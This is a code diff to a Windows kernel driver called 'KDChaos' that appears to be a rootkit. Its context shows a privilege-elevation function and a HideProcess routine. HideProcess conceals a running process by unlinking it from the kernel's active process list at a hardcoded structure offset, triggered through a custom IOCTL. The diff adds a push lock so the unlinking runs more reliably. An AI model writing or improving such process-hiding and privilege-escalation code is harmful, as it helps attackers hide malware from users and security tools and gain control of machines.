@@ -2,7 +2,7 @@
 #include <ntdef.h>
 #include <minwindef.h>
 #include <ntstrsafe.h>
-
+#include <wdm.h>
 
 #define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 
@@ -13,6 +13,8 @@ UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");
 UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");
 
 char* PsGetProcessImageFileName(PEPROCESS Process);
+
+EX_PUSH_LOCK pLock;
 
 int
 PrivilegeElevationForProcess(
@@ -154,11 +156,16 @@ HideProcess(
         }
 
         plist = (PLIST_ENTRY)((char*)process + 0x448);
+
+        ExAcquirePushLockExclusive(&pLock);
+
         plist->Flink->Blink = plist->Blink;
         plist->Blink->Flink = plist->Flink;
-
+        
         plist->Flink = NULL;
         plist->Blink = NULL;
+
+        ExReleasePushLockExclusive(&pLock);
 
         DbgPrint("Process '%wZ' is now hidden", PsGetProcessImageFileName(process));
     }
@@ -240,7 +247,7 @@ DriverEntry(
 )
 {
     DbgPrint("Driver Loaded\n");
-
+    ExInitializePushLock(&pLock);
     UNREFERENCED_PARAMETER(registryPath);
     UNREFERENCED_PARAMETER(driverObject);
 
